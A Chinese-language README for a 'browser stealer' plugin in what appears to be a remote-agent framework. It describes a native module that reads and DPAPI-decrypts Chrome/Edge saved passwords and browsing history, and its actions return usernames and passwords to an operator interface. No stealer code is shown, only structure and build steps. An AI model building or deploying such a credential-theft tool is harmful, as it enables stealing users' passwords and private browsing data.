# Libra Plugin: Browser Stealer (com.libra.browser-stealer)

Libra-Nextgen 浏览器数据插件：读取 Chrome/Edge 的密码（Login Data，DPAPI
解密）与历史记录（History），前端保持原「软件数据 → 浏览器」标签页 UI 与
操作（分页加载/搜索/CSV 导出/密码显隐）。

## 结构

```
browser-stealer/
├── meta.json            # 插件契约（必需，zip 根目录）
├── module/
│   └── browser_stealer  # Agent 端 native 模块（Rust cdylib；源码在
│                        #   src/agent-rs/plugins/browser-stealer/，产物 .dll 放 x64/）
├── service/
│   ├── sdk_utils.cs     # 工具类/静态状态（按文件名排序，先拼接）
│   └── main.cs          # 导出函数（manifest）
├── page/
│   └── index.tsx        # 前端页面源码（分发用；生效位置 src/webapp/src/plugins/<id>/）
├── pack.mjs             # 零依赖打包脚本
└── README.md
```

## 动作（meta.json actions）

| action | module | op | 参数 | 说明 |
|---|---|---|---|---|
| `collect` | `browser_stealer` (native) | `collect` | type/offset/limit | 分页采集，返回 `{total, offset, limit, items}` |
| `search` | `browser_stealer` (native) | `search` | type/keyword | 搜索，返回 `{total, items}` |

`items` 条目形状与宿主 creds 模块一致：
- 密码：`{browser, profile, url, username, password, version}`
- 历史：`{browser, profile, url, title, visits, lastVisit}`

## 构建 native 模块

```bash
cd src/agent-rs
cargo build --release -p browser-stealer-plugin
# 产物 src/agent-rs/target/release/browser_stealer_plugin.dll
# 拷贝到 src/plugins/com.libra.browser-stealer/module/x64/browser_stealer.dll
```

## 打包

```bash
npm run pack   # → dist/com.libra.browser-stealer-1.0.0.zip
```
